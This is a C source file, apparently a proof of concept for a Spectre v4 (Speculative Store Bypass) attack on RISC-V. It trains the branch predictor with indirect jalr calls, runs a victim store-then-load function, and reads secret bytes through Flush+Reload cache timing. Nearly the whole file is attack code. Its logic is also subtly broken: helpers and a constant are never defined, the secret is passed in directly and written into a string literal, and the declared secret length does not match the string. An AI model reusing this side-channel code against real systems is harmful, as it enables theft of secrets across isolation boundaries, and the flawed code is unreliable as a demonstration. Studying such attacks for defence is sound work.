#include <stdio.h>
#include <stdint.h>

// -----------------------------------------------------
// Configuration Parameters
// -----------------------------------------------------
#define NUM_TRAINING         6   // Training iterations related to branch predictor state
#define NUM_ROUNDS           1   // Outer rounds (not really used in inner loop logic)
#define SAME_INDEX_ROUNDS   10   // Repetitions for attacking the same secret index for reliability
#define SECRET_LENGTH       15   // Length of the secret string
#define CACHE_THRESHOLD     50   // Cache hit time threshold in cycles

// -----------------------------------------------------
// Global Arrays and Secret Data
// -----------------------------------------------------
uint64_t array1_size = 16;      // Size of array1 (used for non-secret index selection)
uint8_t  padding1[64];          // Padding
// Array used in the victim function; target for speculative store bypass
uint8_t  array1[160] = {
    1,2,3,4,5,6,7,8,
    9,10,11,12,13,14,15,16
};
uint8_t  padding2[64];          // Padding
// Probe array for Flush+Reload cache side-channel attack
uint8_t  array2[256 * L1_BLOCK_SZ_BYTES];
// Secret data located relative to array1
char* secretData = "ThisIsTheSecretString";

// -----------------------------------------------------
// Utility: Find top two results (e.g., cache hits)
// -----------------------------------------------------
/**
 * @brief Finds the indices and values of the top two largest elements in an array.
 * @param inArray Input array of scores (e.g., cache hit counts).
 * @param inArraySize Size of the input array.
 * @param outIdxArray Output array storing the indices of the top two values.
 * @param outValArray Output array storing the top two values.
 */
void findTopTwo(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray) {
    // Implementation identical to previous examples
    outValArray[0] = 0; outValArray[1] = 0; outIdxArray[0] = 0; outIdxArray[1] = 0;
    for (uint64_t i = 0; i < inArraySize; ++i) {
        if (inArray[i] > outValArray[0]) {
            outValArray[1] = outValArray[0]; outIdxArray[1] = outIdxArray[0];
            outValArray[0] = inArray[i]; outIdxArray[0] = i;
        } else if (inArray[i] > outValArray[1]) {
            outValArray[1] = inArray[i]; outIdxArray[1] = i;
        }
    }
}

// -----------------------------------------------------
// Victim function for Spectre v4 (Speculative Store Bypass - SSB)
// -----------------------------------------------------
/**
 * @brief Demonstrates SSB vulnerability. A store to array1[idx] is followed
 * by a load from array2 indexed by array1[idx]. SSB allows the load
 * to speculatively use a stale value from array1[idx] (from before the store),
 * leaking that stale value via the cache access pattern to array2.
 * @param idx Index into array1, used for both store and subsequent load.
 * @param attackerValue Value to store into array1[idx] (e.g., the current secret byte).
 */
void victimFunctionSSB(uint64_t idx, uint8_t attackerValue) {
    // 1. Store the attacker-controlled value (current secret byte) into array1.
    //    This store might be buffered and not immediately visible to subsequent loads.
    array1[idx] = attackerValue;

    // --- Speculative Execution Window for SSB ---
    // 2. Load from array2, indexed by array1[idx].
    //    Due to SSB, the processor might speculatively use a stale value
    //    of array1[idx] (the value *before* the store above completed)
    //    to calculate the address for this load.
    //    This leaks the *stale* value via the access pattern to array2.
    uint8_t temp = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
    // --- End Speculative Window ---

    // Use temp in inline assembly to prevent compiler optimizing it away.
    asm volatile("" : "+r" (temp) : : "memory");

    // printf("Victim executed: stored %d at index %llu, loaded based on array1[idx]\n", attackerValue, idx); // Debug print
    (void)temp; // Prevent unused warning if asm volatile removed
}

// -----------------------------------------------------
// Placeholder function used during training phases.
// -----------------------------------------------------
void placeholderFunction() {
    asm("nop");
}

int main(void) {
    uint64_t placeholderAddr = (uint64_t)(&placeholderFunction);
    uint64_t victimAddr      = (uint64_t)(&victimFunctionSSB); // Target the SSB victim
    uint64_t startTime, elapsedTime, passInAddr;
    // Calculate offset for secret data relative to array1 start
    uint64_t attackIndex = (uint64_t)(secretData - (char*)array1);
    uint64_t passInIndex, randomIndex; // Index argument (a0); non-secret index
    uint8_t  dummy = 0;            // Dummy variable for cache reads
    static uint64_t results[256]; // Cache hit results

    printf("Starting Spectre v4 (SSB) PoC...\n");

    // Loop through each byte of the secret
    for (uint64_t i = 0; i < SECRET_LENGTH; ++i) {
        // Reset results array
        for (uint64_t j = 0; j < 256; ++j) {
            results[j] = 0;
        }

        printf("\n[Byte %lu] Executing attack...\n", i);

        // Repeat training/attack sequence for reliability
        for (uint64_t round = 0; round < SAME_INDEX_ROUNDS; ++round) {

            // Flush the probe array (array2)
            flushCache((uint64_t)array2, sizeof(array2));

            // Branch predictor training and attack loop
            for (int64_t k = ((NUM_TRAINING + 1) * NUM_ROUNDS) - 1; k >= 0; --k) {
                // Conditionally select target address for JALR: victimAddr or placeholderAddr
                passInAddr = ((k % (NUM_TRAINING + 1)) - 1) & ~0xFFFF;
                passInAddr = (passInAddr | (passInAddr >> 16));
                passInAddr = victimAddr ^ (passInAddr & (placeholderAddr ^ victimAddr));

                // Conditionally select index argument (a0): attackIndex or randomIndex
                randomIndex = round % array1_size; // Use a non-secret index
                passInIndex = ((k % (NUM_TRAINING + 1)) - 1) & ~0xFFFF;
                passInIndex = (passInIndex | (passInIndex >> 16));
                passInIndex = randomIndex ^ (passInIndex & (attackIndex ^ randomIndex));

                // Value to pass as the second argument (a1) to victimFunctionSSB
                // This is the actual secret byte we intend to store (but leak the prior value).
                uint8_t attackerValue = (uint8_t)secretData[i];

                // NOTE: Cache flush was moved outside this inner loop in previous refactoring.
                // Depending on timing, flushing here might be necessary or detrimental.
                // flushCache((uint64_t)array2, sizeof(array2));

                // Loop to potentially manipulate BHR state
                for (uint64_t l = 0; l < 30; ++l) {
                    asm("");
                }

                // Execute JALR after delay, targeting selected address.
                // Pass selected index in a0 and the secret byte value in a1.
                asm volatile(
                    // Delay sequence (FP ops calculating 2, added to addr-2)
                    "addi  %[addr], %[addr], -2          \n"
                    "addi  t1, zero, 2                   \n"
                    "slli  t2, t1, 0x4                    \n"
                    "fcvt.s.lu fa4, t1                    \n"
                    "fcvt.s.lu fa5, t2                    \n"
                    "fdiv.s fa5, fa5, fa4                 \n"
                    "fdiv.s fa5, fa5, fa4                 \n"
                    "fdiv.s fa5, fa5, fa4                 \n"
                    "fdiv.s fa5, fa5, fa4                 \n"
                    "fcvt.lu.s t2, fa5, rtz               \n"
                    "add   %[addr], %[addr], t2           \n"
                    // Setup arguments for the target function
                    "mv    a0, %[arg_idx]                 \n" // a0 = passInIndex
                    "mv    a1, %[arg_val]                 \n" // a1 = attackerValue (secret byte)
                    // Indirect jump and link
                    "jalr  ra, %[addr], 0                 \n"
                    : /* no output */
                    : [addr]     "r" (passInAddr),        // Input: Target address
                      [arg_idx]  "r" (passInIndex),       // Input: Index argument
                      [arg_val]  "r" (attackerValue)      // Input: Value argument
                    // Clobbers: Temps, FP temps, args passed in registers, return address
                    : "t1", "t2", "fa4", "fa5", "a0", "a1", "ra", "memory");
            } // End training/attack k loop

            // Probe phase: Measure access time to array2 elements
            for (uint64_t m = 0; m < 256; ++m) {
                 uint8_t* current_addr = &array2[m * L1_BLOCK_SZ_BYTES];
                 startTime = rdcycle();
                 dummy &= *current_addr; // Access element
                 elapsedTime = rdcycle() - startTime;

                 // Record cache hit
                 if (elapsedTime < CACHE_THRESHOLD) {
                     results[m]++;
                 }
            }
        } // End rounds loop

        // Analyze results: Find the byte value(s) with the most cache hits
        uint8_t  bestGuesses[2];
        uint64_t bestHits[2];
        findTopTwo(results, 256, bestGuesses, bestHits);

        // Print the top two guesses for the current secret byte
        // The leak reveals the value that was in array1[attackIndex] *before* the store.
        printf("Leaked byte @ array1 + 0x%llx = expected_stored('%c') ?= leaked_value:\n",
               (unsigned long long)attackIndex, secretData[i]);
        printf("   1. (hits=%llu, dec=%u, char=%c)\n", (unsigned long long)bestHits[0], bestGuesses[0], (bestGuesses[0] ? bestGuesses[0] : '?'));
        printf("   2. (hits=%llu, dec=%u, char=%c)\n", (unsigned long long)bestHits[1], bestGuesses[1], (bestGuesses[1] ? bestGuesses[1] : '?'));


        // Move to the next character offset
        attackIndex++;
    } // End main secret loop (i)

    // Use dummy to potentially prevent optimization
    asm volatile("" : "+r" (dummy) : : "memory");

    printf("\nExtraction loop finished.\n");
    return 0;
}